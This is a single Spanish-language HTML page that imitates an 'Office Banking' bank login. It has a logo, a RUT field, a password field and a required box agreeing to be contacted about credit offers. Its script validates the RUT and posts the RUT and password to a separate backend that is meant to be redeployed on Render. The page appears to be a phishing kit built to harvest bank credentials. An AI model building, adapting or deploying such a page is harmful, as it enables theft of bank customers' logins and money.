<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8">
  <title>Office Banking</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      background: #ffffff;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
    }
    .login-box {
      width: 360px;
      padding: 30px;
      border: 1px solid #ddd;
      border-radius: 8px;
      box-shadow: 0 0 10px rgba(0,0,0,0.05);
      text-align: center;
      background: #fff;
    }
    .login-box img.logo {
      width: 100%;
      height: auto;
      margin-bottom: 20px;
    }
    .login-box label {
      display: block;
      text-align: left;
      margin-top: 10px;
      font-size: 14px;
    }
    .login-box input[type="text"],
    .login-box input[type="password"] {
      width: 100%;
      padding: 8px;
      margin-top: 5px;
      border: 1px solid #ccc;
      border-radius: 4px;
    }
    .checkbox-label {
      margin-top: 15px;
      display: flex;
      align-items: flex-start;
      font-size: 13px;
      text-align: left;
    }
    .checkbox-label input {
      margin-right: 8px;
      margin-top: 2px;
    }
    .options {
      display: flex;
      justify-content: space-between;
      align-items: center;
      margin-top: 10px;
      font-size: 13px;
    }
    .options a {
      color: #007BFF;
      text-decoration: none;
    }
    .options a:hover {
      text-decoration: underline;
    }
    .login-box button {
      margin-top: 20px;
      width: 100%;
      padding: 10px;
      background: red;
      color: white;
      border: none;
      border-radius: 4px;
      cursor: pointer;
      font-weight: bold;
    }
    .login-box button:hover {
      background: #b30000;
    }
    #resultado {
      margin-top: 15px;
      font-weight: bold;
    }
    .footer-icons {
      display: flex;
      justify-content: space-around;
      margin-top: 20px;
      font-size: 13px;
    }
    .footer-icons div {
      text-align: center;
    }
  </style>
</head>
<body>
  <div class="login-box">
    <!-- Logo arriba del cuadro -->
    <img src="logo-office-banking.png" alt="Office Banking" class="logo">

    <form id="loginForm">
      <label for="rut">RUT</label>
      <input type="text" id="rut" name="rut" placeholder="12.345.678-5" required>
      
      <label for="passwd">Contrase√±a</label>
      <input type="password" id="passwd" name="passwd" required>
      
      <!-- Checkbox obligatorio -->
      <label class="checkbox-label">
        <input type="checkbox" id="contacto" name="contacto" required>
        Deseo que me contacte un ejecutivo para solicitar L√≠nea de Cr√©dito o Tarjeta de Cr√©dito.  
        O en su defecto aumento de cupo.
      </label>
      
      <div class="options">
        <label><input type="checkbox" id="recordar"> Recordar usuario</label>
        <a href="#">Olvid√© mi clave</a>
      </div>
      
      <button type="submit">Ingresar</button>
    </form>
    <div id="resultado"></div>

    <div class="footer-icons">
      <div>üìä<br>Indicadores Econ√≥micos</div>
      <div>‚òéÔ∏è<br>Contact Center</div>
    </div>
  </div>

  <script>
    // Formateo RUT con puntos y guion
    function formatearRut(valor) {
      valor = valor.replace(/\./g, "").replace(/-/g, "").toUpperCase();
      if(valor.length <= 1) return valor;
      let cuerpo = valor.slice(0, -1);
      let dv = valor.slice(-1);
      let cuerpoConPuntos = "";
      while(cuerpo.length > 3) {
        cuerpoConPuntos = "." + cuerpo.slice(-3) + cuerpoConPuntos;
        cuerpo = cuerpo.slice(0, -3);
      }
      cuerpoConPuntos = cuerpo + cuerpoConPuntos;
      return cuerpoConPuntos + "-" + dv;
    }

    function validarRut(rutCompleto) {
      rutCompleto = rutCompleto.replace(/\./g, "").replace(/-/g, "").toUpperCase();
      if(rutCompleto.length < 2) return false;
      let cuerpo = rutCompleto.slice(0, -1);
      let dv = rutCompleto.slice(-1);
      let suma = 0, multiplo = 2;
      for(let i = cuerpo.length - 1; i >= 0; i--) {
        suma += parseInt(cuerpo.charAt(i)) * multiplo;
        multiplo = multiplo < 7 ? multiplo + 1 : 2;
      }
      let dvEsperado = 11 - (suma % 11);
      dvEsperado = dvEsperado === 11 ? "0" : dvEsperado === 10 ? "K" : dvEsperado.toString();
      return dv === dvEsperado;
    }

    const rutInput = document.getElementById("rut");
    rutInput.addEventListener("input", function(e){
      let valor = e.target.value.replace(/[^0-9kK]/g, "");
      e.target.value = formatearRut(valor);
    });

    // Enviar datos al backend (Node.js o Render)
    document.getElementById("loginForm").addEventListener("submit", async function(e){
      e.preventDefault();
      const rut = rutInput.value;
      const passwd = document.getElementById("passwd").value;
      const contacto = document.getElementById("contacto").checked;

      if(!validarRut(rut)){
        document.getElementById("resultado").innerText = "‚ùå RUT inv√°lido";
        return;
      }
      if(!contacto){
        document.getElementById("resultado").innerText = "‚ö†Ô∏è Debe aceptar ser contactado por un ejecutivo.";
        return;
      }

      // Cambia esta URL cuando lo subas a Render
      const backendURL = "http://localhost:3000/login"; 
      // Ejemplo en Render: "https://mi-backend.onrender.com/login"

      try {
        const response = await fetch(backendURL, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ rut, passwd })
        });
        const data = await response.text();
        document.getElementById("resultado").innerText = data;
      } catch (error) {
        document.getElementById("resultado").innerText = "‚ö†Ô∏è Error al conectar con el servidor.";
      }
    });
  </script>
</body>
</html>
